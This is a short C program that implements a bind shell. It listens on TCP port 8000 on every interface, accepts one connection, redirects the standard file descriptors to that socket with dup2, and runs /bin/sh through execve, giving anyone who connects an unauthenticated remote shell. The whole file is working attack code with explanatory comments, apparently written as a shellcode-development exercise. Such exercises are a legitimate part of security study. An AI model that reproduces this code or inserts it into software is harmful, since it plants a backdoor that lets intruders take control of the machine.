#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <stdio.h>
void main() {
// Create an IPv4 socket
int sock = socket (AF_INET, SOCK_STREAM, 0);
// Preparing the socket to bind
struct sockaddr_in addr;
addr.sin_family = AF_INET;          // IPv4
addr.sin_addr.s_addr = INADDR_ANY;  // 0.0.0.0 = Use all interfaces
addr.sin_port = htons (8000);	    // Port number
int ret;
// Bind the socket and wait for connections
ret = bind (sock, (struct sockaddr*)&addr, sizeof (addr));
ret = listen (sock, 1);
// Accept incoming connections
int client = accept (sock, (struct sockaddr*)NULL, NULL);
// Duplicate file descriptors, socket, stdin, stdout, stderr
for (int i=sock; i>=0; i--) {
	dup2 (client, i);
}
// Execute the shell useing execve
char *argv[] = { "/bin/sh", 0 };
execve ("/bin/sh", argv, NULL);
}
